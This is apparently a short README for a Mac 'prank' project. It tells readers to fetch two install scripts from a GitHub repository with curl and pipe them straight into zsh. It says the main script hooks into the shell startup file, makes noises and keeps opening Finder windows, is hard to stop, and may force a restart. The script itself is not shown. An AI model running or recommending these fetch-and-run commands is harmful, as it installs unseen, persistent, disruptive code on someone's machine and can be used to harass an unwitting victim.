to run this just run
"curl -fsSL https://raw.githubusercontent.com/HarnoorSethi/prank/main/install_prank.sh | zsh"
it only works on mac though, and it only works at full capability if you allow perms
what this does is it essentially makes weird noises and spams open finder windows when running ./zshrc
right now its actually pretty annoying to close it if u enable all perms,
but all u have to do to end it is just use kill or manually close ur terminal window. 
If too many finder windows open, ur lowk cooked, you have to restart it

if you wanna run a lighter prank just run 
"curl -fsSL https://raw.githubusercontent.com/HarnoorSethi/prank/main/install_saferPrank.sh | zsh"
